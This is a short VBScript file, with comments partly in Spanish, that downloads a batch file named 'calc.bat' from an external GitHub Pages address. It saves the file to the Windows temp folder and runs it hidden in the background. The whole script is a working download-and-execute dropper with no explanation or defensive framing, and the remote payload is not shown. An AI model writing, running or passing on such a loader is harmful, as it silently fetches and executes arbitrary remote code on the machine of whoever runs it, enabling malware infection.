Dim url, downloadPath, http, stream, shell

' URL of the .bat file
url = "https://domainduck.github.io/duckdomain/calc.bat"

' Route where the bat will be downloaded
downloadPath = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) & "\calc.bat"

' HTTP object for the download
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile downloadPath, 2 
    stream.Close

    Set shell = CreateObject("WScript.Shell")
    shell.Run downloadPath, 0, False ' Ejecutar en segundo plano
End If